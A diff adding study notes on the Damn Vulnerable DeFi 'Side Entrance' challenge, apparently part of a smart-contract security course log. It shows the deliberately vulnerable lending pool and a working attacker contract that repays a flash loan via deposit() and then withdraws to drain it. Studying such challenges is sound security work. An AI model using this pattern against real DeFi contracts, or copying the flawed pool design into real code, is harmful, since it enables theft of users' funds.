@@ -159,6 +159,105 @@ contract ForceSend {
 }
 ```
 
+## Damn Vulnerable DeFi - Side Entrance
+
+### Contract
+
+```solidity
+// SPDX-License-Identifier: MIT
+
+pragma solidity ^0.8.0;
+
+import "solady/src/utils/SafeTransferLib.sol";
+
+interface IFlashLoanEtherReceiver {
+    function execute() external payable;
+}
+
+/**
+ * @title SideEntranceLenderPool
+ * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
+ */
+contract SideEntranceLenderPool {
+    mapping(address => uint256) private balances;
+
+    error RepayFailed();
+
+    event Deposit(address indexed who, uint256 amount);
+    event Withdraw(address indexed who, uint256 amount);
+
+    function deposit() external payable {
+        unchecked {
+            balances[msg.sender] += msg.value;
+        }
+        emit Deposit(msg.sender, msg.value);
+    }
+
+    function withdraw() external {
+        uint256 amount = balances[msg.sender];
+        
+        delete balances[msg.sender];
+        emit Withdraw(msg.sender, amount);
+
+        SafeTransferLib.safeTransferETH(msg.sender, amount);
+    }
+
+    function flashLoan(uint256 amount) external {
+        uint256 balanceBefore = address(this).balance;
+
+        IFlashLoanEtherReceiver(msg.sender).execute{value: amount}();
+
+        if (address(this).balance < balanceBefore)
+            revert RepayFailed();
+    }
+}
+```
+
+### Exploit
+
+This challenge is conveniently solved via Remix. First, we deploy the contract from Remix's default account. Next, we call `deposit`, specifying a transaction value of `42000000000000000000 == 42 ether` to fund the pool with its initial balance. (The original assignment described in Damn Vulnerable DeFi specifies a pool with an initial balance of 1000 ether instead of 42 ether. However, bumping the contract's balance up to 1000 ether is quite tedious in Remix. Since the exact pool balance doesn't really matter, we'll assume a pool balance of 42 ether instead of 1000 ether for convenience.)
+
+With the initial setup completed, we now have to find a way to drain all funds from the contract using a different account than the one we used for the deposit.
+
+To achieve that, we can deploy an attacker contract that will perform the following steps:
+
+1. Call `flashLoan` to borrow 42 ether.
+2. Pay back the flash loan by calling `deposit` with a value of 42 ether. Notice that this will register a deposit balance of 42 ether for the attacker contract!
+3. Call `withdraw` to drain 42 ether from the pool.
+
+All of the above steps can be performed with a single function call to `attack` using the contract shown below. Notice that 
+
+1. you must specify the victim contract's address during the deployment of the attacker contract and
+2. you must specify `amount = 42000000000000000000` when calling `attack`.
+
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+import "./SideEntranceLenderPool.sol";
+
+contract SideEntranceLenderPoolAttacker {
+
+    SideEntranceLenderPool public sideEntranceLenderPool;
+
+    constructor(SideEntranceLenderPool _sideEntranceLenderPool) {
+        sideEntranceLenderPool = _sideEntranceLenderPool;
+    }
+
+    receive() external payable {}
+
+    function execute() external payable {
+        (bool success, ) = msg.sender.call{value: msg.value}(abi.encodeWithSignature("deposit()"));
+        require(success, "Deposit failed");
+    }
+
+    function attack(uint256 amount) external {
+        sideEntranceLenderPool.flashLoan(amount);
+        sideEntranceLenderPool.withdraw();
+    }
+} 
+```
+
 # Security - Week 1
 
 ## Capture the Ether (RareSkills Repo) - Guess the Secret Number
